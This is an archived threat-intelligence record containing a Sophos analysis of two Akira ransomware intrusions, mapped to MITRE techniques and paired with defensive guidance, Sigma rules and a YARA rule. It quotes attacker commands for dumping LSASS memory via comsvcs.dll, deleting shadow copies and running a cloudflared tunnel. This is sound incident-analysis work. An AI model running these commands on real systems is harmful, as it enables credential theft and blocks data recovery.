{
    "id": "fac971f5-e497-4cd4-854d-473bf536f138",
    "created_at": "2023-06-05T02:07:30.741677Z",
    "updated_at": "2024-11-22T02:02:56.610311Z",
    "deleted_at": null,
    "sha1_hash": "1545d29dd761b5afa7a3d5613cecd86d24c49408",
    "title": "2023-05-09 - Akira Ransomware is \u201cbringin\u2019 1988 back\u201d",
    "authors": "",
    "file_creation_date": "2023-06-04T12:41:25Z",
    "file_modification_date": "2023-06-04T12:41:25Z",
    "file_size": 817310,
    "plain_text": "Akira Ransomware is \u201cbringin\u2019 1988 back\u201d\nnews.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\nPaul Jaramillo\n\nMay 9, 2023\n\nOn April 6, 2023, the Sophos Incident Response team was engaged to support a\nransomware victim organization in North America. The following week on April 12, 2023, yet\nanother North American organization contacted Sophos for assistance.\nWhile the incidents appeared to be the work of two different criminal actors, both deployed a\nrecently emerged ransomware called Akira. In both cases, the affected organizations had\nfiles encrypted with the \u201c.akira\u201d extensions and had nearly identical ransom note files, named\nfn.txt, dropped in the process (as shown below in Figure 1].\n\n1/13\n\nFigure 1: \u201cfn.txt\u201d ransomware notice\nThis Akira ransomware bears no code similarity to a previous ransomware strain with the\nsame name that was active in 2017 and is likely unrelated. The new jQuery-based leak site\n(Figure 2), with its retro green colors, has garnered most of the attention, as it accepts\ncommands instead of listing out information.\nHowever, cool as their leak site design may be, this matters none to victims of this\nransomware, which regrettably includes a daycare service in Canada. While the total number\nof victim organizations (Figure 3) are still relatively small in comparison to Lockbit or\nBlackCat/APLHV, that is how all new ransomware families begin.\n\n2/13\n\nFigure 3: Timeline analysis of Akira victims\nIn this blog post, we will compare two separate incident attack flows, illustrating how different\nthreat actors are deploying Akira ransomware. Please note that available data on the second\nincident is limited, but we are highlighting deviations between the two incidents. This\ninformation will provide organizations with detailed guidance on what they need to defend\nagainst to protect their businesses.\n\nAttack Flow Details\nInitial Access\nIncident #1\nA user account purposedly configured to allow for Multi-Factor Authentication (MFA) bypass.\n[T1078 \u2013 Valid Accounts] [T1133 \u2013 External Remote Service]\nExternal IP access from the threat actor was routed through European TOR VPN exit\nnodes.\n\nIncident #2\nVPN access using Single Factor authentication.\n[T1078 \u2013 Valid Accounts] [T1133 \u2013 External Remote Service]\n\nGuidance\n3/13\n\nReplacing password-only authentication with MFA remains one of the highest return-oninvestment (ROI) security controls, however special attention must be given to auditing for\nany accounts with bypass exceptions. Also, its recommended that organizations block any\ninbound traffic from TOR networks where perimeter controls are available.\n\nCredential Access\nIncident #1\nMinidump of LSASS process memory leveraging comsvcs.dll with proxy execution by\nrundll32.exe.\n[T1003.001 \u2013 OS Credential Dumping: LSASS Memory] [T1569 \u2013 System Services]\nService Name: TcwvBcuf\nAction: %COMSPEC% /Q /c cmD.Exe /Q /c for /f \"\"tokens=1,2 delims= \"\" ^%A in\n('\"\"tasklist /fi \"\"Imagename eq lsass.exe\"\" | find \"\"lsass\"\"\"\"')\ndo rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+0000^24 ^%B \\Windows\\Temp\\FP4.docx\nfull\"\n\nThe use of a .docx extension is not as common as .dmp or .txt\nThe service name is a random eight characters and different strings were observed\nacross different systems.\nCredential access activity also occurred over the network, as this Sophos endpoint detection\nindicates:\n'Creds_4h (T1003.002)' malicious behaviour detected in\n'C:\\Windows\\System32\\svchost.exe'\n\nIncident #2\nWhile execution details are limited, multiple systems had the file\nC:\\Windows\\MEMORY.DMP created prior to ransomware execution correlating with\nWindows event log data.\n[T1003.001 \u2013 OS Credential Dumping: LSASS Memory] [T1569 \u2013 System Services]\n[4656 / 0x1230] Source Name: Microsoft-Windows-Security-Auditing Strings: ['S-1-5-18\u2019\n\u2018<Redacted>$' ' Redacted>' '0x00000000000003e7'\n'Security' 'Process' '\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe'\n'0x0000000000000524' '{00000000-0000-0000-0000-000000000000}'\n'%%4490\n%%4492\n' '-' '0x00001400' '-' '0' '0x0000000000001318'\n'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' '-']\n\nGuidance\n4/13\n\nDumping process memory to obtain credentials is a pervasive technique observed in most\nransomware incidents. Aside from ensuring full coverage of your endpoint agent, special\ncare should be taken to segment domain admin accounts from workstation admin accounts\nto reduce the impact of credential dumping when it does occur. This is also a great candidate\nfor a repeatable hunt, using a structured method to look for variations in the pre- and postdumping activity that may have bypassed your existing detections. Listed below is a Sigma\nrule that can be used by defenders to detect or hunt on the credential access technique used\nabove.\ntitle: Using the Minidump function of comsvcs.dll\ndescription: The minidump function of comsvcs.dll can be used to dump lsass.exe. The\nfunction requires the PID of lsass.exe. In addition, the Minidump function can be\ncalled using #24 rather than its name.\nauthor: Sophos MDR\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- \\\\sc.exe\n- \\\\cmd.exe\n- \\\\powershell.exe\ncommand_line_filter:\nCommandLine|re: .*comsvcs.*(minidump|#24).*\ncondition: selection AND command_line_filter\nfalsepositives:\n- Penetration testing\nlevel: high\ntags:\n- attack.credential access #TA0006\n- attack.T1003.001\n\nDiscovery\nIncident #1\nConducting discovery indirectly via schedule tasks named \u201cWindows Update\u201d performing\nremote directory listings.\n[T1083 \u2013 File and Directory Discovery] [T1053.005 \u2013 Scheduled Task/Job: Scheduled Task]\nC:\\>type c:\\programdata\\HP\\ms.bat\ndir \"\"\\\\10.1.100.64\\c$\\ProgramData\"\" >> C:\\programdata\\HP\\svr_dir.txtt\"\n\n5/13\n\nLeveraging a dual-use tool, PCHunter64, to acquire detailed process and system\ninformation.\n[T1082 \u2013 System Information Discovery] [T1105 \u2013 Ingress Tool Transfer]\nURL: :2023040620230407: administrator@https://www.google[.]com/url?\nesrc=s&q=&rct=j&sa=U&url=https://m.majorgeeks[.]com/files/details/pc_hunter.html\nAccess count: 1\nURL: Visited: administrator@hXXps://temp[.]sh/PewtN/PCHunter64.exe Access count: 9\n\nThe threat actor initially searched online for the tool before staging it for future\ndownloads using a public cloud hosting service.\n\nIncident #2\nUtilization of a dual-use tool, Advanced IP Scanner, to discover other systems and networks.\n[T1018 \u2013 Remote System Discovery]\nPrefetch [ADVANCED_IP_SCANNER_2.5.4594.] was executed - run count 2 hash: 0xC2980947\nvolume: 1 [serial number: 0x22E2CC6E\ndevice path: \\VOLUME{01d89216e27acb2f-22e2cc6e}]\nEmploying an existing IT tool, LANSweeper, to access detailed network and system\ninformation.\n[T1018 - Remote System Discovery] [T1087 - Account Discovery: Domain Account]\nVisited: <redacted>@file:///C:/ProgramData/AdComputers.csv\nVisited: <redacted>@file:///C:/ProgramData/AdSubnets.csv\nVisited: <redacted>@file:///C:/ProgramData/AdOUs.csv\nVisited: <redacted>@file:///C:/ProgramData/AdUsers.csv\nURL F[:]/IT/Backups/Database/LANSweeper%20SQL+Key/Encryption.txt\n\nThe threat actor accessed the decryption key to facilitate gaining reconnaissance\ninformation without doing any noisy discovery scanning.\n\nGuidance\nUnderstanding the intention of a dual-use tool being executed is challenging; however, it\u2019s\nbest practice to document which tools are approved for corporate use and block all others by\ndefault until they can be reviewed. This has the added benefit of reducing shadow IT risk as\n\n6/13\n\nwell. Additionally, just like high value business data, access to both the tool and the output of\nvulnerability scanners and asset discovery applications should be restricted and audited. We\nhave also included an example Sigma detection rule for the activity shown in incident #1.\ntitle: Listing Directories of Remote Hosts\ndescription: Threat actors can use windows binaries and commands to discover\ninteresting to them directories on remote hosts and redirect the output to a file on\ndisc for later consumption.\nauthor: Sophos MDR\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- 'cmd.exe'\n- 'powershell.exe'\nCommandLine|contains:\n- 'dir *\\\\*\\c$\\*>>'\n- 'ls *\\\\*\\c$\\*>>'\nfilter:\nParentImage|endswith:\n- 'java.exe'\ncondition: selection and not filter\nfalsepositives:\n- Possible from admin activity\nlevel: high\ntags:\n- attack.discovery #TA0007\n- attack.T1083\n\nLateral Movement\nIncident #1\nThere were no network restrictions on Remote Desktop Protocol (RDP), and the threat actor\nwas able to move freely across the network; as a result, this activity was captured by multiple\nevent types.\n\n7/13\n\nEvent ID [1149] - RDP connection established\nEvent ID [1149]\nRDP from from IP: <Redacted>\nEvent ID: 25 - Remote Desktop Services: Session reconnection succeeded\nEvent ID: 24 - Remote Desktop Services: Session has been disconnected\nEvent ID [4624]\nRDP Type \"3\" from IP: <Redacted> - Device: <Redacted>\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\<Redacted>]\nUsername hint: <Redacted>\n\"<Provider Name=\"\"Microsoft-Windows-RemoteDesktopServices-RdpCoreTS\"\" Guid=\"\"\n{1139C61B-B549-4251-8ED3-27250A1EDEC8}\"\" />\n<EventID>131</EventID>\n<Version>0</Version>\n<Level>4</Level>\n<Task>4</Task>\n<Opcode>15</Opcode>\n<Keywords>0x4000000000000000</Keywords>\n<TimeCreated SystemTime=\"\"2023-04-06T09:23:41.969586500Z\"\" />\n<EventRecordID>633</EventRecordID>\n<Correlation ActivityID=\"\"{F4208FE1-4D5D-45DF-B8E2-A851AC3F0000}\"\" />\n<Execution ProcessID=\"\"1136\"\" ThreadID=\"\"2228\"\" />\n<Channel>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational</Channel>\n<Computer> <Redacted> </Computer>\n<Security UserID=\"\"S-1-5-20\"\" />\n</System>\n<EventData>\n<Data Name=\"\"ConnType\"\">TCP</Data>\n<Data Name=\"\"ClientIP\"\"> <Redacted>:56736</Data>\n</EventData>\n</Event>\"\n\nIncident #2\nSimilar to Incident #1, the threat actor was able to RDP unencumbered across the\norganization\u2019s infrastructure.\n\nGuidance\nSecuring RDP access can be difficult for many companies, but it is a project worthy of\ninvestment. The first item to check off the box is to restrict by role, which accounts can\naccess other systems using RDP. The overwhelming majority of users do not need this\naccess. Secondly, adopting a centralized jump server, which only admins can access with\nMFA and blocking at the network level other system to system RDP is a strong preventative\ncontrol. Lastly, a detection should be in place to promptly review anomalous RDP\nconnections to deconflict them with approved system administration activity.\n\nDefense Evasion\nIncident #1\n\n8/13\n\nThe threat actor executed two actions to bypass Windows Defender\n[T1562.001 \u2013 Impair Defenses: Disable or Modify Tools]\n5001 - Real-time Protection was disabled\nNew Value\">HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\\n\nGuidance\nThe first line of defense available to organizations is to use a security agent that has robust\ntamper protection. In terms of monitoring for this activity, these are detection-ready event\nsources. While its possible a system administrator would make such exceptions during\ntroubleshooting, given the risk of this activity, it\u2019s something that should be investigated\npromptly if a corresponding support ticket isn\u2019t found.\n\nCommand and Control\nIncident #1\nDuring this incident, the threat actor leveraged one of the most popular dual-use agents,\nAnyDesk, to provide persistent remote access into the affected organization on multiple\nsystems.\n[T1219 \u2013 Remote Access Software]\nUserAssist entry: 86 Value name: C:\\Users\\administrator.<Redacted>\n\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\14J9H2AA\\AnyDesk.exe\nCount: 1\nEvent ID [7045] \"Service Name: Anydesk\" \"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\"\"\n--service\"\nPrefetch [ANYDESK.EXE] was executed - run count 9 path: \\PROGRAM FILES\n(X86)\\ANYDESK\\ANYDESK.EXE hash: 0x389EE9E9 volume: 1\n[serial number: 0x7077BC2C device path: \\VOLUME{01cf89bc76f2a351-7077bc2c}]\n\nIncident #2\nThe threat actor almost immediately installed Cloudflare\u2019s freely available tunnelling software\nhere, C:\\ProgramData\\windows_update.exe, followed by the download and execution of\nanother dual-use agent, Radmin\n[T1572 \u2013 Protocol Tunneling ] [T1219 \u2013 Remote Access Software]\n\n9/13\n\nC:\\programdata\\windows_update.exe tunnel run --token\neyJhIjoiODllZDkxZjgyNWE3ZGM3NGY4ZmRlMTc2MWY3ZDcwMWMiLCJ0IjoiMTUwMGIxMGEtZjM3My00ZmJlLT\n4ZTYtODgwMDMxYzE1M2VkIiwicyI6IlpURmtZV0V6TUdFdFpETXlOeTAwT0dRNUxUazNaakF0T1RsbVpESmxab\n\nhxxps://download[.]radmin[.]com/download/files/Radmin_3.5.2.1_EN[.]zip\n(Radmin_3.5.2.1_EN.zip)\n\nA feature of Advanced IP Scanner is integration with Radmin to provide remote access\nto scanned systems\n\nGuidance\nJust as with the discovery activity, threat actor usage of dual-use agents is both\ncommonplace and important to disrupt. All non-approved remote access solutions should be\nblocked by default by an application control capability. Aside from allowing command and\ncontrol (C2) and data exfiltration opportunities for an attacker, there is also a latent risk of the\nsoftware itself having vulnerabilities and being unpatched because it\u2019s not being managed by\nIT.\n\nCollection\nIncident #2\nA confirmed compromised account was used to download the WinRar archiving software and\nseveral files were staged for possible, but unconfirmed exfiltration\n[T1560.001 \u2013 Archive Collected Data: Archive via Utility]\nURL Visited: hxxps://notifier.rarlab[.]com/?\nlanguage=English&source=RARLAB&landingpage=first&version=621&architecture=64\nUserassist 2023-03-15T10:15:55Z C:\\Users\\<Redacted>\\Downloads\\winrar.exe\nUserassist 2023-03-15T11:04:42Z C:\\ProgramData\\winrar.exe\nURL Visited: E:/<Redacted>Dept.rar\nURL Visited: E:/<Redacted>Channel.rar\n\nGuidance\nOften by the time a threat actor is staging data, it\u2019s too late to have a good security outcome.\nA good approach to prevent theft of data is to adopt least privilege access, which means\nensuring only the required people have access, followed by granular controls on exporting,\nsharing, or moving the files. DLP solutions, while having a history of being difficult to\nimplement and maintain, are worth evaluating for high-risk data.\n\nImpact\n10/13\n\nIncident #1\nC:\\ProgramData\\Update.bat file executed the ransomware binary dllhost32.exe, which is\ndetected as Troj/Ransom-GWA by Sophos (Figure 4)\n[T11486 \u2013 Data Encrypted for Impact] [T1490 \u2013 Inhibit System Recovery]\ndllhost32.exe -n=10 -s=C:\\ESD\\sharez.txt\ndllhost32.exe -n=1 -s=C:\\program files\\sharez.txt\npowershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\"\n\n\u2013n option is for encryption percentage, the attacker used different settings during the\nincident\n-s option is for \u2013share_file, there is a \u2013p option for \u2013encryption_path\nRemoving the shadow copies prevents recovery using native Window\u2019s features and\nSophos detects this as Impact_6a.\nCreates the C:\\fn.txt or C:\\etc\\fn.txt ransom note when complete\nDwell time of 7 days before executing ransomware\nOn endpoints protected with Sophos the following detections triggered:\nCryptoGuard detected ransomware in C:\\ProgramData\\dllhost32.exe\n'Cleanup_1a (T1486)' malicious behavior detected in 'C:\\ProgramData\\dllhost32.exe'\n\nIncident #2\nRansomware binary C:\\ProgramData\\hpupdate.exe is executed and detected as\nTroj/Ransom-GWG by Sophos\n[T11486 \u2013 Data Encrypted for Impact] [T1490 \u2013 Inhibit System Recovery]\nCreates the C:\\fn.txt ransom note when complete\nDwell time of 30+ days before executing ransomware\nAs previously reported by Bleeping Computer, Akira targets 26 specific file extensions for\nencryption. These extensions are predominantly related to databases, but also include\ntargeting of virtual memory and disk images. Notably, it it does not target PDFs or typical\nMicrosoft Office file types:\n.abcddb\n\n.accdb\n\n.accde\n\n.accdc\n\n.accdt\n\n.accdr\n\n.accdw\n\n.accft\n\n.dacpac\n\n.daschema\n\n.dadiagram\n\n.db-shm\n11/13\n\n.db-wal\n\n.fmpsl\n\n.fmp12\n\n.kexic\n\n.kexis\n\n.nrmlib\n\n.sas7bdat\n\n.sqlite\n\n.sqlitedb\n\n.sqlite3\n\n.xmlff\n\n.nvram\n\n.subvol\n\n.qcow2\n\nSophosLabs researchers have also confirmed which file extensions are avoided by Akira in\norder to not impact system stability.\n\nFigure 5: File types excluded by\n\nAkira\n\nGuidance\nAs mentioned earlier, at this late stage in the attack, having full coverage on all systems with\na properly configured XDR solution is vital to protect organizations from ransomware. In the\ncase of Sophos, it\u2019s critical for customers to have their CryptoGuard policy activated, which is\nsomething support can guide customers on. We have also provided the YARA rule below,\nwhich can be used to identify Akira ransomware binaries.\n\n12/13\n\nrule ecrime_AKIRA_strings {\nmeta:\nid = \"8c59c35d-8fb8-4644-9fa4-ce05b30e91c3\"\nversion = \"1.0\"\nauthor = \"Paul Jaramillo\"\nintrusion_set = \"AKIRA\"\ndescription = \"Detects common strings\"\nsource = \"PE binaries\"\ncreation_date = \"2023-05-03\"\nmodification_date = \"2023-05-09\"\nclassification = \"TLP:CLEAR\"\nstrings:\n$s1 = \".akira\" ascii nocase\n$s2 = \"akira_readme.txt\" ascii nocase\n$s3 = \".onion\" ascii nocase\n$s4 = /\\\\akira\\\\asio\\\\include\\\\asio\\\\impl\\\\co_spawn\\.hpp/\n$s5 = /MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAylJbjtFvzHapC/\ncondition:\n(filesize>250KB and filesize<1MB) and\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x4550 and\n(($s1 and $s2 and $s3) or\n$s4 or $s5)\n}\n\nPlease be aware that threat actors will continue to modify the code, which was evident when\nwe uncovered the following new file name being used \u201creadme-asldkas.txt\u201d.\n\nConclusion\nSophos MDR is sharing this information with the specific goal of aiding defenders in the\nseemingly never-ending battle with ransomware threat groups. Through each of the covered\nsteps in the attack flow, specific guidance is provided to drive actions with context. Aside\nfrom the differences in C2 tools used (AnyDesk vs Cloudflared), one of the key points to\nhighlight is the dwell time. Incident #1 had a dwell time of 7 days compared to incident #2\nwith over 30 days of dwell time. Both of these events demonstrate a slower operational\ntempo, which bodes well for defenders having opportunities to disrupt in-flight compromises.\nThe time from initial access to ransomware impact is indicative of the complex e-crime\necosystem, where there are distributors, initial access brokers, malware developers, and\nransomware affiliates working together from resource development to payment.\nUnfortunately, there are some edge cases where organizations have had their files encrypted\nwithin just 24 hours, and that type of threat really does require an experienced, global\npartner, such as Sophos, to augment your security program.\nAcknowledgements\nSophos would like to acknowledge the contributions of Melisa Kelly, Jason Jenkins, Anand\nAjjan, Steeve Gaudreault, Kostas Tsialemis, and Sean Gallagher this report.\n\n13/13",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-09 - Akira Ransomware is \u201cbringin\u2019 1988 back\u201d.pdf"
    ],
    "report_names": [
        "2023-05-09 - Akira Ransomware is \u201cbringin\u2019 1988 back\u201d.pdf"
    ],
    "threat_actors": [
        {
            "id": "8c8fea8c-c957-4618-99ee-1e188f073a0e",
            "created_at": "2024-02-02T02:00:04.086766Z",
            "updated_at": "2024-11-22T02:00:02.986069Z",
            "deleted_at": null,
            "main_name": "Storm-1567",
            "aliases": [
                "Akira",
                "PUNK SPIDER",
                "GOLD SAHARA"
            ],
            "source_name": "MISPGALAXY:Storm-1567",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "910b38e9-07fe-4b47-9cf4-e190a07b1b84",
            "created_at": "2024-04-24T02:00:49.516358Z",
            "updated_at": "2024-11-22T02:00:52.336529Z",
            "deleted_at": null,
            "main_name": "Akira",
            "aliases": [
                "Akira",
                "GOLD SAHARA",
                "PUNK SPIDER"
            ],
            "source_name": "MITRE:Akira",
            "tools": [
                "Mimikatz",
                "PsExec",
                "AdFind",
                "Akira",
                "LaZagne",
                "Rclone"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1685930850741,
    "ts_updated_at": 1732240976610,
    "ts_creation_date": 1685882485000,
    "ts_modification_date": 1685882485000,
    "files": {
        "pdf": "https://archive.orkl.eu/1545d29dd761b5afa7a3d5613cecd86d24c49408.pdf",
        "text": "https://archive.orkl.eu/1545d29dd761b5afa7a3d5613cecd86d24c49408.txt",
        "img": "https://archive.orkl.eu/1545d29dd761b5afa7a3d5613cecd86d24c49408.jpg"
    }
}